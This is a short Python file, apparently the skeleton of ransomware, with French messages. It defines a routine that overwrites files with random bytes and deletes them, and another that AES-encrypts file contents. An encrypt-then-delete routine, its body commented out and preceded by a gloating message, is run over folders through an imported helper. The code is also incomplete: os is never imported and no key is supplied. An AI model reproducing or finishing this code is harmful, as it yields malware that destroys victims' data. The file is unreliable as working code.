from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from folder_commands.execute import execute

def secure_delete(file_path):
    try:
        with open(file_path, 'r+b') as f:
            file_size = os.path.getsize(file_path)
            f.write(os.urandom(file_size))
        os.remove(file_path)
        print(f'Fichier : {file_path} supprimé avec succès')
    except Exception as e:
        print(f"Erreur lors de la suppression sécurisée de {file_path}: {e}")

def encrypt_file(file_path, key):
    print(f'Cryptage du fichier : {file_path}')
    with open(file_path, 'rb') as f:
        file_data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.iv + cipher.encrypt(pad(file_data, AES.block_size))
    return ciphertext

def encrypt_and_delete(file_path, key):
    print('JE VAIS TOUT KC AHAHAH')
    # ciphertext = encrypt_file(file_path, key)
    # encrypted_file_path = file_path + ".enc"
    # with open(encrypted_file_path, 'wb') as f:
    #     f.write(ciphertext)
    # encrypted_files[file_path] = encrypted_file_path
    # secure_delete(file_path)

if __name__ == '__main__':
    execute(encrypt_and_delete)